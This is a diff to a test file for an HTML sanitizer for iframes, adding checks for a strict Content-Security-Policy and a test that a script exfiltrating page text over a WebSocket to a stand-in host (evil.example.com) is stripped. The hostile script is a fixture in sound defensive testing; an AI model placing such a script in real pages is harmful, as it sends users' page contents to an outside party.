@@ -24,6 +24,8 @@ describe("sanitizeIframeHtml", () => {
     expect(sanitized).toContain("@tailwindcss/browser@4");
     expect(sanitized).toContain("chart.umd.min.js");
     expect(sanitized).toContain("new Chart(");
+    expect(sanitized).toContain("Content-Security-Policy");
+    expect(sanitized).toContain("connect-src 'none'");
   });
 
   it("removes disallowed and unsafe scripts", () => {
@@ -35,6 +37,19 @@ describe("sanitizeIframeHtml", () => {
     const sanitized = sanitizeIframeHtml(html);
     expect(sanitized).not.toContain("evil.example.com");
     expect(sanitized).not.toContain("fetch(");
+  });
+
+  it("removes scripts with websocket-style exfiltration patterns", () => {
+    const html = `
+      <script>
+        const ws = new WebSocket("wss://evil.example.com");
+        ws.onopen = () => ws.send(document.body.innerText);
+      </script>
+    `;
+
+    const sanitized = sanitizeIframeHtml(html);
+    expect(sanitized).not.toContain("WebSocket");
+    expect(sanitized).not.toContain("evil.example.com");
   });
 
   it("removes disallowed tags, handlers, and javascript: URLs", () => {
